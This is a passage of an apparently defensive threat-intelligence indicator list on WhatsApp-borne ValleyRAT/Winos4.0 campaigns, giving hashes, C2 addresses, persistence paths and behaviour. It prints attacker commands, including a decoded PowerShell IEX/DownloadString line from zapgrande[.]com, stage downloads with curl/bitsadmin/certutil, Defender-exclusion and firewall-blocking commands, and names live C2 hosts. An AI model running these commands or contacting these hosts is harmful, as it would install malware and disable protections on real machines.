# IOCs: WhatsApp "Click here to view" ZIP (Winos4.0 / ValleyRAT family)

Sample received on WhatsApp in Malaysia, October 2026. Analysed statically in an isolated Linux VM.

## Files (SHA-256)
| File | SHA-256 | Notes |
|---|---|---|
| `Click here to view10.6_2459.zip` | `550d08c8459ef11e6177309526c0738848d064f7de5c91e0760255fc93159f99` | Lure sent over WhatsApp |
| `Click here to view10.6.vhd` | `053432539a408652f1104aad3c9c4d72d9e68f530f509aa5c982c75451f71958` | Virtual disk inside the ZIP (mounts on double-click, avoids Mark-of-the-Web) |
| `H4752110510.exe` | `c74f55247aa2c72001024bd977c869cb5adce6f8604a4d32329f015b73ae2a49` | Legit signed `KafanInputService.exe` (Shanghai Kafan), used as sideload host |
| `RImE.dLl` (hidden) | `539b49f6ddfa070d25adbd8cd47c10bbba5cacf5bf27fddfe89d96f0c729b2fb` | Fake `rime.dll`, Winos4.0 stager (CAPEv2 YARA `WinosStager`) |
| `71749365-82be-4d58-bc96-c38e3da39ea9.dat` (hidden) | `12b9470634bb7f76419c70ee9a510147cd6bcfce920f2abee5afdd13901b383d` | Encrypted payload/config |
| `hidserv.dll` (hidden) | `2da61980a54cf44081a111e319ee7ab2165743383a4dbb0dca811389779721ba` | Genuine Microsoft file, used as cover |
| resource `VMUI_ES/104` -> `ardrv.sys` | `1c5129b4d63f2d5252b5b02a0a7d655dac3b6eac23dd4ed92b4dd55f243387ff` | Signed OPSWAT driver, abused to kill AV (BYOVD) |
| resource `VMUI_FR/105` -> `ZyArk.sys` | `46883bc25c77678f60c1b836f4c438d87158c9af6b229f533522f635a0d5276e` | Signed Baidu BdArKit driver, abused to kill AV (BYOVD) |

Driver resources are RC4-encrypted; key = ASCII hex string `335D0F051BA4D8B0E57DDC7F66EEB5D9` (stored XOR 0xFC), 16 bytes after hex-decoding.

## Behaviour
- Payload cached in `HKCU\Console\0` / `HKCU\Console\1` (REG_BINARY), loaded into RWX memory.
- Config override `HKCU\Console\IpDate`, final-stage config `HKCU\Software\IpDates_info` (per eSentire).
- Relaunch: `cmd /c start "" rundll32.exe "<dir>\RIME.dll",_vmclientcore@16 "<arg>"`; mutex `7D29FD842A3F8A91A6A69DD152086C2A`.
- Next stage after 60 s via `curl -L -s -o`, `bitsadmin /transfer myJob_%u`, or `certutil -urlcache -split -f`,
  saved in `%TEMP%` as `dd_vcredist_x86_*_vcRuntimeMinimum_x86.exe`.
- Injection with `VirtualAllocEx` + `WriteProcessMemory`.
- C2 address not recovered: the `.dat` is decrypted by virtualised code.

## Second variant: SilverFox KuGou loader (Pelagos Intel, Sep 2026)

Also delivered over WhatsApp in Malaysia. Not analysed by us; IOCs from the Pelagos Intel report.
Lure names follow `PDF_C<digits>_<yyyymmddhhmmss>.zip` and `DOC_<digits>_<yyyymmddhhmmss>.zip`. The ZIP holds an IMG disk image.

| File | SHA-256 | Notes |
|---|---|---|
| `PDF_C2841_20260911100446.zip` | `9f2caeda208c9d729b44f31c32b5e1eeef18d84d6e36b04afe15d894d3809672` | Lure sent over WhatsApp |
| IMG inside the ZIP | `e2bf8b7cd396ee950a5b6911ea098c2e49d4ed002a6c04d5d660ccd4f7d66baa` | Disk image |
| `PDF_C2089_20260911100446.exe` | `f712c2a8b4abf2e299a2b480020333deb0f43364e9686cda78b1243c62e4830d` | Signed KuGou `active_desktop_launcher.exe` (Guangzhou Kugou Technology, thumbprint `757BDD02CBA91CA59C46E2098A5479C1ABC1FDBE`), sideload host |
| `active_desktop_render_x64.dll` | `c1e184615241fe69db3bf4093a22c7c0bf5d6072d2f51e558142b844e871084f` | Unsigned loader posing as DWM helper |

- Staging: `%APPDATA%\Microsoft\Update\`
- Persistence: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` value `MicrosoftUpdate`
- C2: `134.122.155.135:443`, retries about every 3 s
- Config marker `@@RAPID_CFG_START@@`; PDB `D:\buildbot\build1\desktop_screen\build\bin\active_desktop_launcher_x64.pdb`

## October 2026 wave (Malaysia, reported by @a.xydiel on Threads)
Lure message: "Kindly forward the attached Statement of Account to your Finance Manager for review. Please open it on a computer, as full details may not be visible on mobile."
- Lure names: `PDF_FTFWCI_20261009125351.vhd`, `PDF_EXZ12S_20261022110417.zip`/`.vhd`, `20261019-MYS2026Y1019E51AC.zip`/`.vhd`, `20261019.MYS2026Y1019A7F2E.zip`, `101.zip`
- Payload files: `plcc3a.dat`, `eneio64.dat` (run with `rundll32.exe`)
- Persistence and AV evasion: `schtasks /Create /SC ONLOGON /RL HIGHEST` with an empty task name, running hidden PowerShell `Add-MpPreference -ExclusionPath ... -ExclusionProcess 'QtsUpdater.exe','svchost.exe'`; also touches `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet`
- UAC bypass through `CoGetObject` (COM elevation moniker) then `ShellExec`
- One victim's PC stayed quiet for 12 days, then sent the ZIP to every contact
- No hashes published yet

## ABCDoor / RustSL tax-lure campaign (Kaspersky GReAT, 30 Apr 2026)
Same Silver Fox group, targeting India, Indonesia, Russia, South Africa (and Japan in newer loaders). Not yet seen in Malaysia, but it uses the same "Statement of Account" theme.
- Lure archives: `Statement of Account.zip` (MD5 f8371097121549feb21e3bcc2eeea522), `November Statement.zip`, `December Statement.zip`, `CBDT.zip`, `ITD.-.rar`; programs inside: `Review the file.exe`, `BillReceipt.exe`, `statement.exe`, `statement verify .exe`, `Click File.exe`, `GST Suvidha.exe`, `MCA-Ministry.exe`, `RemoteInstaller_<date>_whatsapp.exe`
- ABCDoor: `%LOCALAPPDATA%\appclient\python\pythonw.exe -m appclient`, Run value and task `AppClient` (every minute), `HKCU\Environment\UserInitMprLogonScript`, `HKCU\Software\CarEmu` (`FirstInstallTime`, `InstallChannel`), `%LOCALAPPDATA%\applogs\exception_logs.zip`, `%LOCALAPPDATA%\appclient\111.zip`, `update.bat`; NodeJS dropped to `%USERPROFILE%\.node\node.exe` by the JS loader
- ValleyRAT registry: `HKCU\Console\0`, `HKCU\Console\IpDate` (already detected)
- ValleyRAT C2: 108.187.37.85, 108.187.42.63, 207.56.138.28; ABCDoor C2: 45.118.133.203:5000; payload hosts 154.82.81.205, 154.82.81.192, 108.187.41.221
- Domains: abc.fetish-friends.com, abc.3mkorealtd.com, abc.sudsmama.com, abc.woopami.com, abc.ilptour.com, abc.petitechanson.com, abc.doublemobile.com, mcagov.cc, roldco.com, vnc.kcii2.com, abc.haijing88.com
- Kaspersky publishes MD5 only; the scanner matches SHA-256, so these are detected by name and behaviour.

## Thunder.exe / libexpat.dll variant (CloudSEK, 24 Dec 2025, India)
Income-tax lure PDF opens `ggwk[.]cc`, which serves `tax affairs.exe` (NSIS installer). It drops signed Xunlei `Thunder.exe` beside a fake `libexpat.dll` in `%TEMP%`; the DLL disables Windows Update (`wuauserv`), decrypts `box.ini`, hollows `explorer.exe` (Donut), and runs ValleyRAT. Plugins go in `HKCU\Console\0\d33f351a4aeea5e608853d1a56661059` and are injected into `tracerpt.exe`.
- SHA-256: 77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2 (stage 1), fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19 (stage 2), f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa (stage 3), 068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbced7741245a7ea97c (stage 4)
- C2: b.yuxuanow.top (103.20.195.147), ggwk.cc (45.207.231.94); related tax-themed domains itdd.club, xzghjec.com, gov-a.work/.fit/.club, gvo-b.club, gov-c.club, govk.club, swjc2025bjkb.cn, 2025swmm.cn

## SORVEPOTEL shortcut sample (VirusTotal, first seen 1 Oct 2025)
`malware-whatsapp.rar` (SHA-256 5debd60e266037898bd11f94de614b8411ee2c6b4fd1d54ca0c21578a67614ac, 727 bytes, 27/76 engines, Trend Micro name SORVEPOTEL) contains `DOC-50998906_17774E7A.lnk` (SHA-256 af085f3afbe074c0da6a354be3aabc4677ed03bd0627b4447fb68c6e16089943). The shortcut runs an obfuscated `cmd /D/C "for %Y in (nc) do ..."` that builds `powershell -w hid -enc ...`, which decodes to `IEX (New-Object Net.WebClient).DownloadString('https://zapgrande[.]com/api/itbi/PxlJWZbCuamhhCWjurXBv6K0w1vfVGTw')`. C2: zapgrande.com (109.176.30.141:443).

SORVEPOTEL stage 2 (code shared on X, Portuguese comments): PowerShell copies `Cookies`, `Preferences` and `Secure Preferences` from the Chrome profile to `C:\temp\ChromeWpp`, downloads `C:\temp\chromedriver.exe` (Chrome for Testing) and `C:\temp\wppconnect-wa.js` (github.com/wppconnect-team/wa-js), installs the `Selenium` PowerShell module for the current user, kills Chrome, opens WhatsApp Web with the copied session, sends the lure to contacts, and POSTs machine name, OS and the contact list (name + number) to `api.php` / `log.php` / `config.php` / `contacts.php` on the attacker server. Chrome only.

Trend Micro (3 Oct 2025, Water Saci / SORVEPOTEL, Brazil): lure names `RES-20250930_112057.zip`, `ORCAMENTO_114418.zip`, `COMPROVANTE_20251001_094031.zip`, `ComprovanteSantander-*.zip`, `NEW-20251001_133944-PED_1273E322.zip`, `DOC-98083986_4B17B4B2.lnk`; persistence `HealthApp-<6 hex>.bat` in the user Startup folder; payload injected into `powershell_ise.exe`; Selenium + chromedriver dropped in `%TEMP%`; Maverick banking trojan only runs on Brazilian-locale PCs, the WhatsApp spreader also accepts en-GB/UK. C2: zapgrande.com, sorvetenopote.com (and typos), expansiveuser.com, expansivebot.com, imobiliariaricardoparanhos.com, casadecampoamazonas.com, bravexolutions.com (23.227.203.179), adoblesecuryt.com (140.99.164.81), saogeraldoshoping.com (92.246.130.15); IPs 109.176.30.141, 165.154.254.44, 23.227.203.148, 77.111.101.169. LNK SHA-256: 2150f38c436eabebd3a93b3ace1064315153c882ce763991b6d0fb798766e0db, bd62148637152396b757c8b106d5a62982bce9df12f0a6030dda9138e44e7328, 441a2ad553d166df3cd0ea02482f4b8370e8f9618753e1937a251a6318cb8eba; BAT: c50b6ff360e5614d91f80a5e2d616a9d0d1a9984751bf251f065426a63dac0b5. Full list: https://www.trendmicro.com/en_gb/research/25/j/self-propagating-malware-spreads-via-whatsapp.html Figures in the TrendAI copy add: the startup check looks for any Startup `.bat` containing `for %%` and ` in (` before writing `HealthApp-<6 hex>.bat`, whose content pulls `<C2>/api/itbi/startup/<GUID>`; the WhatsApp module checks Chromium profiles for WhatsApp data (`CheckChromiumWhatsAppData`) and carries an embedded `wppconnect-wa.js` and Selenium manager; the decoded lure text says "Viewing allowed only on computers. If you use Chrome, you may be asked to 'Keep' the file because it is zipped".

## Recent ValleyRAT samples (Recorded Future Triage, Sep-Oct 2026)

Pulled with a Triage researcher account (`family:valleyrat`, then pivot on C2 IP). These are other countries' lures from the same toolset; the hashes and C2s carry over.

| SHA-256 | Size | What |
|---|---|---|
| `38e37bdef23d31ca49c2b72effd4d46ab617b86a5227343a3e407cfb7af92971` | 6787333 | `20260921125639-A901C2F58FFEBD.zip` |
| `9524d7051fde6bfcfb8a90c305994e66df20686bd06cdfa9173149db9eb05467` | 6966908 | `20260928011445-82407B6DADBFA0.zip` |
| `88e32dfea6c94b16a89e9c3b66a01f5bc1c99b4abddb48060cbe5c06b77907d3` | 2619192 | `L3914012809.exe` |
| `ff5c63c88e165d842ca962c442dc6199e56f544b00d24c0580783771814f456e` | 8263680 | `pdfcorE8.dll` |
| `4dfce433a8cea1829fc8fc9d7284cb5fdb332695413923a7fa1b702fd637bcb3` | 12928233 | `PDF_資金移動完了証明書.ZIP` (Japanese) |
| `7aad062881f577d7bb560bb7288800a29e041b11b3aef3c0103d08659e894c5e` | 3950592 | `DX03_702A.img` |
| `743cc997baf10e3a072cd5dc6d724b1127b59c4d201524eaab3df0ccde6cbd35` | 1610752 | `desk_compositor_x64.dll` |
| `7eca6ff78c9a067293de9ac651b8f1292acc5f098e8e97dcafa1bdef9b8a61c2` | 108928 | `人事變動與薪資調整.exe` |
| `633700324ad7abdf0fcaee0498e4d3bef9093c51ee4d611e02303e0f8f1a58e2` | 1559216 | `2920AF89E37017CC869EA4F83FEE12EC.exe` |
| `25a87693ff2e67858bb5379f7f30092b1eba127307b0bcf24029d04911b6ebbe` | 4444160 | `税務報告書.img` |
| `c09d9caef509f0f6001f1d3e3bb7f71d57aa77b7bfa751e198fe12c317cb77f2` | 450192 | `税務報告書.exe` |
| `42f21f4389db441c9b57b765320ba628673bd9856002bb20f0359bfd783d48a9` | 463904 | `_Top.dat` |
| `c5d9b6e889ac776410b9e70930bc12afa202843d8ec2aa971204c416a3251c76` | 35896 | `_Bottom.dat` |
| `29f67c17b528a877949878a3d0453a34c6f5eee7d872edd33c0996b057b56258` | 726016 | `_Driver.cnf` |

C2: `14.128.53.155` (ports 21131, 21132, 443, 449; extracted ValleyRAT config), `45.202.1.249` (contacted by both timestamp ZIPs and `L3914012809.exe`). The October Malaysian `Click here to view*.zip` (`550d08c8…`) is also in Triage as `sample-malware.zip`, same hash already listed above.

## WhatsApp VBS + ManageEngine campaign (Securelist 22 Jun 2026, MyCERT MA-1464.062026, Microsoft 31 Mar 2026)

80% of Securelist's victims are in Malaysia. A `.vbs`/`.vbe` arrives over WhatsApp with no text, makes a hidden folder `C:\Users\Public\Documents\MSUpdate_<5 digits>` (or `Temp_*`, `Sys*`, `Data*`), copies curl/bitsadmin there as `winhttp.dll`/`wininet.dll`, sets `ConsentPromptBehaviorAdmin` = 0, then silently installs `UEMSAgent.msi` with `UEMSAgent.mst`, `DCAgentServerInfo.json`, `DMRootCA.crt`, `DMRootCA-Server.crt`, `setup1.vbs`.

- C2: `202.61.160.208`, `202.61.160.202`, `202.61.160.201`, `202.61.160.160`, `202.61.160.137`, `38.55.151.63`
- Domains: `temu.baskwms.top`, `invoice.msopsa.top`, `qse.shoppes.help`, `shaaslong.one`, `baoxis.cc`
- Payload buckets: `baolongwes`/`sdcwww.oss-ap-southeast-1.aliyuncs.com`; `baoyuw2s`/`hksha3`/`sjdkjj23`/`xijkwm2`/`yifubafu`/`bafauac`/`9ding.s3.ap-southeast-1.amazonaws.com`; `caiwuascw`/`facaia.s3.us-east-005.backblazeb2.com`; `sinjiabo-1398259625.cos.ap-singapore.myqcloud.com`
- Malay lures: `Penyata bank.vbs`, `Sila semak bil anda.vbs`. Others: `Acknowledgment of Debt.vbs`, `December statement of account.vbs`, `Reconciliation.vbs`, `Customer Statement(A).vbe`, `Statement of Debt(30K)`, `Outstanding Balance Sheet`, `Promissory_Note(b)`, `Income Tax Return Form.vbs`
- Hashes: Securelist lists 40 MD5 only, no sizes; not usable by the scanner. MyCERT references SHA-256 `65662fbfee31784502f46a4ea3cf58a5146d6f6299b40391cd71c9fc67e3e621`.
- Microsoft variant: hidden `C:\ProgramData\EDS8738\` with curl as `netapi.dll` and bitsadmin as `sc.exe`, junk key `HKLM\SOFTWARE\Microsoft\Win`, unsigned `Setup.msi`/`WinRAR.msi`/`LinkPoint.msi`/`AnyDesk.msi`, domains `neescil.top`, `velthora.top`.

Hive Pro advisory TA2026174 (23 Jun 2026, https://www.hivepro.com/threat-advisory/whatsapp-campaign-turns-victims-into-remotely-managed-hosts) lists 35 SHA-256 lure scripts from the Securelist report; 34 were new here. All 34 are VBScript on VirusTotal (14-39/75, looked up 7 Nov 2026) and are in `$KnownBad` with their sizes:

- `09cfe9dbd75095b17ccea62466ff128279e54a0d501587ec9c5b992b987b5784` 10145 bytes, Debt Note (2).vbs, VT 32/75
- `03402dbfc9ccfe612c37405bbcf072c9c07273fe4f77e82f8238a31d0040094d` 5067 bytes, Applicationform1.vbs, VT 34/75
- `b798fcbc54e84c03ac2b7be97d016d05f04cd754db36dd5c6cfbf3aedd0b7dff` 6714 bytes, Extrato de Conciliacao.vbs, VT 35/75
- `f10dae1863e89f72adf8ba913b8a9fa898e6a430430098722e62600a2d4e94a4` 7107 bytes, Statement of Debt(29K).vbs, VT 35/75
- `1f92da4c68b8c88edf6e055ef75efd1dcf55296e252545f5782880f6556564d4` 7094 bytes, Outstanding Payment List.vbs, VT 24/75
- `6169aee26b75b486018e4fd10a2ec8d67de7d382c9f2900f2b8d78ea0c1cda33` 10144 bytes, billing statement (2).vbs, VT 30/75
- `cca9c3f98c6552a7b52132b4fb3d969db5c743b7e663e630d37ce8b2f619c30a` 10142 bytes, Statement of Debt(A).vbs, VT 33/75
- `0d3d531a8fae455a0676ef4408a683c8af0671fd589bb6106aff4637439d73a7` 7146 bytes, Financial Reports(C1).vbs, VT 32/75
- `452259dc297f56cf22c7932e8fbcefe821ef9c3127134074fae585f89355d397` 6971 bytes, (no lure name), VT 36/75
- `a95ee5a8c40c7705f1612335f3e4f4fcd8a28692095c04e0d48f7a6e77caa42b` 27253 bytes, Outstanding Balance Sheet(A).vbs, VT 14/75
- `3140c5bee192b0f125e188451a68b82199ee551dbab78c92d04711588c400669` 20694 bytes, (no lure name), VT 32/75
- `2223cc6687d89a5273041e5410948a852536ed8b63d67a8cec9e0fdae884cb64` 72856 bytes, Penyata bank.vbs, VT 34/75
- `f37d677ad936d6409e64a3ecc9f3685c455826db3dabbf21e8c54eb01ebd9128` 41784 bytes, Account Statement(13K) (2).vbs, VT 36/75
- `01f1eb07125db5de0c2362afc777aa015f136feabd769628f01d01ac6472646c` 12538 bytes, (no lure name), VT 32/75
- `02a7db29d35cf01ed94b6dfb14a7026bb2906d8fa9a99ef801040c52284cceb1` 6494 bytes, Bitte fullen Sie das Formular fur Umsatzsteuer-Nullsatz-Verkaufe aus..vbs, VT 23/75
- `d36f50ecfb6a9104f235df7aefdbddab699495532ede9c79ef1a577dce359a90` 61809 bytes, Account Statement.vbs, VT 32/75
- `cff48752738313b9cb36bb381bbd415ac7d2e8395387b972460b58983af68fb7` 7050 bytes, Statement of Account(O).vbs, VT 31/75
- `ae44ee4b40c478c109e795c328812d9ebb82750233cf18d0dd3ac1d4518a08c6` 7062 bytes, Sila semak bil anda..vbs, VT 33/75
- `99681a15717aedb8f3d2df119d313334442f8505869866f8bfdabd54dd7c8ac3` 7078 bytes, Sila semak bil anda..vbs, VT 35/75
- `69efbea795491bdac117a299f18977f1e2968a06e7cd3a11f6366169d7214b04` 7149 bytes, (no lure name), VT 33/75
- `4195efdeb8833f17e545d1e46bfcbfa634382a5efe5696cedc24043c9e116372` 4522 bytes, (no lure name), VT 37/75
- `3a18072502c440c51cf8bf42f21fa6fa3216788982892868380c04818fb61291` 7042 bytes, (no lure name), VT 39/75
- `1c5e88505728e1b11507fe7d6672eb89de200bd45c79030fe60edae2a17b69cf` 5337 bytes, dfjieya.vbs, VT 37/75
- `3c9cc5b72fdd0a52fcecae8c5b952933163527599a15189a01ded39a1a8609e4` 5332 bytes, 0lf.vbs, VT 32/75
- `5adf130842c88d6b732def0f5fd1be2a889a3f7dfbc5af5ff7438374f3ded233` 10396 bytes, iowepv.vbs, VT 35/75
- `27b5cea842c0add3cb0d7a106ee190eda65201e45cfcfd20f340fd26d1290118` 9450 bytes, btksfmsi.vbs, VT 36/75
- `07f4130e0a52e8c63d8c3dcc989eb185161ea917a9c45900692fdf031af13ab1` 8990 bytes, home3.vbs, VT 33/75
- `845d8887ec023255c9896d1644c821168c33b5e8426519228ab3003715fe19dc` 5510 bytes, zipats.vbs, VT 36/75
- `50c74b468c217776b8890b841baefec8b196b14083a7873a9201c838a8e4c90a` 6400 bytes, 1122.vbs, VT 36/75
- `76d351946565aed51b1cb8361097ca5e7d9a6d281300a188cfa8aff9b6845234` 2863 bytes, payload_1.vbs, VT 34/75
- `be532be5beac3c7656654628cc557e546aea3ee47c0046428a53d23ac58875d1` 2883 bytes, sac8.vbs, VT 25/75
- `c30408b75ebc58d15f2766db15e3789dbf2909b0d71c99a13499e25270c275ee` 38365 bytes, 6oy.vbs, VT 35/75
- `28292b9822d83e28c0a5bb3befdd5b188be351314e9b3a1c2740702722999cfa` 6403 bytes, kof.vbs, VT 36/75
- `4a1b69a8ab51378c1e36c5d9944c4a345e0502cb8cfe2ab7fd9a9496553b02c6` 31554 bytes, zip_bloy.vbs, VT 35/75

Sample `65662fbf…` (VirusTotal, 7107 bytes, `Statement of Debt(30K).vbs`): stages curl as `lib.dll` and bitsadmin as `sys.dll` in `MSUpdate_<5 digits>`, pulls `https://baolongwes.oss-ap-southeast-1.aliyuncs.com/blaoso/owpa.txt` → `run.vbs` → `/kasf/spsx.vbs` → `/blaoso/alOffic.zip`; agent C2 `https://202.61.160.160:8383/`; registry `HKLM\Software\WOW6432Node\AdventNet\DesktopCentral\DCAgent` with `DsRootCertPath`/`ServerRootCertPath` pointing into the `MSUpdate_` folder; mutexes `dcResourceId_Mutex`, `dcCertCreationStatusMutex`. Child hashes with sizes are in `$KnownBad`.

Triage sweep of 79 runs (setup1.vbs, spsx.vbs, owpa.txt, alOffic.zip): further agent C2 on port 8383 `202.61.160.203`, `202.61.160.145`, `137.220.205.167`, `137.220.205.162`, `137.220.224.63`, `103.140.154.117`, `206.238.68.33`, `43.224.224.151` (also `192.229.81.105`, `192.229.87.219`, left out as shared CDN space); downloads `https://azuheq.s3.ap-southeast-1.amazonaws.com/19881.exe`, `https://www.kammwv.cc/222/9989.exe`, `d156sk07toobyl.cloudfront.net`. 16 more installer-kit zips (all 32.8-32.9 MB, same contents) and the attacker `DCAgentServerInfo.json` (`b57b2334…`, 1670 bytes) are in `$KnownBad`.

Victim report (29 Oct 2026, Malwarebytes screenshots): a ManageEngine agent in `C:\Program Files (x86)\ManageEngine\UEMS_Agent\` kept connecting to `134.122.155.148:8027` about once a minute. Next to the ValleyRAT server `134.122.155.135`. The same agent (`UEMS_Agent\bin\dcondemand.exe`) also used port 8383. A day later Malwarebytes on that PC quarantined `%APPDATA%\Microsoft\Windows\System\client.exe` (Trojan.Downloader) and `keylogger.exe` (Trojan.KeyLogger), started by `Run` values named `WindowsUpdate` in both HKLM and HKCU (Backdoor.IRCBot.Gen / Trojan.Agent.E.Gen).

## VulcanRAT207.A (Morphisec via 2-Spyware, Oct 2026)

WhatsApp ZIP with `Statement.exe` / `Tax-202609078869.exe`. Sideloads through `vulkaninfo-64.exe`, `vulkan-1.dll`, `vulkan-1.bin` in `C:\Program Files\Common Files`, persists as task `\Microsoft\Windows\USOPrivate` (or `USOPrivate Kit`), kills Baidu AV (`bdservicehost.exe`, `bduserhost.exe`) with `GoFly64.sys`. C2 `61.18.208.27:8888`.

## October 2026 research round (Triage, Netresec, Kaspersky, Sekoia, Elastic, Chinese reports)

New Triage samples with Malaysian lures, 12-28 Oct 2026 (`family:valleyrat_s2`):

| SHA-256 | Size | What |
|---|---|---|
| `68eaeb29ad982b515ef13fcf731a60ec2b3c02e5be250a0099c7cff5fdc90048` | 3950313 | `SENARAIDOKUMEN.zip` |
| `5f7446871ba78c9c19eac3b5bbb1db62a983b754100e6d5b0b502966fdfa2e74` | 3972897 | `SENARAIDOKUMEN.zip` |
| `a692da9f60b4eb890c8636bb57e380af7d6517835b863e66c81c3f8b00658cf1` | 3868051 | `SENARAIDOKUMEN.zip` |
| `355ee70e091b82b987d09db3cf8ba4176da316c220a72742f74a9e604199c79b` | 411648 | `LHDNCUKAI20261003122.iso` |
| `1b89fbcd8fdf994ca32c48889ba617919ee16443692b1cfc7a2b8f3f5518a2c9` | 448512 | `Open_to_view_0a7a.iso` |
| `de0b9b6656c9e9fc9db4271610a09c2ae27d07c5a4757e94b2e0314a9dda6ee4` | 25672 | `Open_to_view.exe` (inside the LHDN/Open_to_view ISOs) |
| `5634caef6a5988f33d5116c74403892ddb648929983c52a6b9d7893ac5549401` | 3041300 | `21 Oktober 2026-INVOIS_4340.zip` |
| `2db09f27b7f8b17dee095f71e65910864345659a7c4fe00d0fff30f95d0a8c57` | 3347821 | `INVOIS.vhd.zip` |
| `0569371406eeca4d84078be94c2be98916294b89a7121c1e757b687a5ccdfe30` | 3170806 | `Memeriksa.vhd.zip` |
| `b46788cb5d9def3e1c7136de29eb8904ac9543b5c28035fb1fa0e9006c3aeb29` | 13063 | `NOTIS TUNTUTAN CUKAI DAN PENALTI.eml` |
| `9eaa140159f6e91af428a5f3ae608a170346238eb4ebca27ed36cb791af8bfc4` | 1766235 | `SSM-1.IMG.zip` |
| `3a89fee824764cd99e6e0c7c7f1655bc2fe1bd41b79ab4f2eb0074e0e866fd9b` | 4525653 | `PDF_32JG2C_20261016154922.ZIP` |
| `23b927dd668e5707d1de867e9e3f6217ef8cfc6803d18ac9a168dcfc9416070b` | 3140084 | `SOA.vhd.zip` (contains `Rime.DLL`) |
| `971eecc4288a550ff9606dd8af9601c10714f9e41a2d5fcac325647a0cdf0cd0` | 18919424 | `10200944247016.67F21F26697FEF16429.vhd` |
| `07806661d056305e832b509a1b517241420d8aa6bccadaff5e0768d5131406fd` | 2009626 | `JK-18005144.zip` (`Notice from Tax Departmen.exe`) |
| `426bfd72b3143c76c83bfb3246f820e3cc17902ea04293a35764b67fc635ec3d` | 655359 | ValleyRAT IRBM sample ZIP |
| `e43c872558aeac504df57d7f292518086f61c8b5c4abf282576bcf6bd1cecbed` | 1564951 | `TAX_tjA8Q7d8.img.zip` (`TaxFiling.exe`) |
| `2c77d954eb79cc5b038b024d84848360d496b51c85ac8e97399d70d1bc3d0413` | 1288192 | dropper, becomes `WinCombo.exe` |
| `9f326ede322930a7d5e149fa8720802b0623c1972dc54e41a2a73608fb6810dd` | 17224 | unknown file dropped with ZyArk.sys |
| `ad91e674edb5f376d27a3c56df45ebb967229ee9ba623ec158f8c4835d577def` | 1724051 | Japanese tax-report `.img.zip` (Sep 2026) |

Host indicators seen in the sandbox runs:
- MicroPoint chain: `C:\ProgramData\MicroPoint\WinCombo.exe`, `EraseCode.dat`, `Security_Module.dat`, `magic_xe_core.dll`; HKLM Run value `ServiceController` / `iServiceController`; UAC bypass through `HKCU\Software\Classes\CLSID\{GUID}\Shell\Manage\command` then `explorer.exe shell:::{GUID}`; sets `ConsentPromptBehaviorAdmin=0`, `PromptOnSecureDesktop=0`.
- crClient chain: `C:\Windows\System32\CRClient.dll` run with `rundll32 ...,EBWebView`; ZyArk.sys in a junk-named folder under `C:\Users\Public`.
- encrashRep chain: `C:\Users\Public\Libraries\<junk>\webview2_integration.exe` + `encrashrep.dll`.
- LHDN/Open_to_view ISOs: `%LOCALAPPDATA%\Toolkit\winhttp.dll`. SSM/SOA IMG: driver service `EmbeddedDriverService` from `%TEMP%\EmbeddedDriverService.sys`.
- C2: `khltt1.club`, `lsf168.club`, `pxxjbh.club`, `liyunee.top`, `articio.top`, `kyur7oz.top`, `uykb10.club`, `gntr30.club`, `kufp16.club`, `txpfproxy.vip`, `jksdjkjs.cc`, `shougong9.com`, `thinnected.com`, `tax{cerf,low,gg,zz,yy}.top` (ThreatFox); IPs `202.61.85.151`, `202.61.85.179`, `202.61.85.173`, `202.61.85.47`, `87.84.204.93`, `156.251.11.79`, `137.220.152.244`, `154.213.180.91`, `137.220.153.147`, `202.146.222.95`, `202.61.157.33`, `202.61.160.183`, `101.33.117.120`, `143.109.37.187`, `47.243.109.132`, `204.194.50.231`.

Other reports:
- Netresec (25 Jun 2026), Ping32 variant of the WhatsApp VBS campaign: `NSecRTS.exe`, `ManagementTool.exe`, `CoreShield.msi`, C2 `143.92.37.168`, payload host `fadaoxiao.s3.us-west-004.backblazeb2.com`. Treated like ManageEngine: removed on a personal PC.
- Kaspersky (31 Aug 2026), QN Wallpaper ValleyRAT: `C:\Program Files\QNWallpaper\`, C2 `103.45.66.18`, `192.253.225.173`.
- Sekoia (24 Mar 2026, Malaysia): `C:\WhatsAppBackup\WhatsAppData.zip`, `%TEMP%\whatsapp_backup.lock`, `C:\Users\Public\Download\bb.jpg`, `xqwmwru.top` / `154.201.87.124`, `9010.360sdgg.com`, SyncFuture RMM `<ipv4>ClientSetup.exe`.
- C1BAS: `ExceptCatch.dll`, `C:\ProgramData\TailScale\`.
- Elastic TCLBANKER: task `RuntimeOptimizeService`, `%TEMP%\msvc-rt14\bin\hostfxr.exe`, C2 `*.ef971a42.workers.dev`, `mxtestacionamentos.com`, `191.96.224.96`; SHA-256 `701d51b7be8b034c860bf97847bd59a87dca8481c4625328813746964995b626`, `8a174aa70a4396547045aef6c69eb0259bae1706880f4375af71085eeb537059`, `668f932433a24bbae89d60b24eee4a24808fc741f62c5a3043bb7c9152342f40`, `63beb7372098c03baab77e0dfc8e5dca5e0a7420f382708a4df79bed2d900394` (last one: size unknown, not matched).
- Chinese reports (ThreatBook, Huorong, QiAnXin, 2026): `C:\ProgramData\WindowsData\`, `funzip.exe`, `men.exe`, `KANG.exe`, `kail.exe`, `NtHandleCallback.exe`, `edr.key`, `me.key`, drivers `rwdriver.sys`, `kabuto.sys`, `C:\XiaoH.sys`, `C:\Windows\Temp\ranchserv.jpg`; registry `HKLM\SOFTWARE\JDBCC`, `HKLM\SOFTWARE\SysConfigDate`; services `TCLService`, `Cndom6`; tasks `\Microsoft\Windows\AppID\MicrosoftEdgeUpdateTaskUA Task-S-1-5-18*`, `WindowsPowerShell.WbemScripting.WindowsData`; Defender exclusion of every drive; `netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound`. C2 `38.91.115.114`, `8.210.25.225`, `95.40.29.190`, `16.163.105.153`, `183.90.186.193`, `52.128.226.74`, `154.83.17.175`, `45.204.2.166`, `uuuucome.com`, `laosjdhd.cn`, `xxxjjj250711.com`, `twsww.xin`, `cn-hk-oss-vip.com`. SHA-256 `3ba89047b9fb9ae2281e06a7f10a407698174b201f28fc1cadb930207254e485`, `9ace6a1e4bee5834be38b4c2fd26780d1fcc18ea9d58224e31d6382c19e53296`, `a14b681ec50328d3ac04f76ac18ef96fb7176425ff96325e2099ea57df3a1998` (matched); `305a1c784db4e88267f1d35b914b6ce4702f2b1196c1cdf14c024d63d1d4871f`, 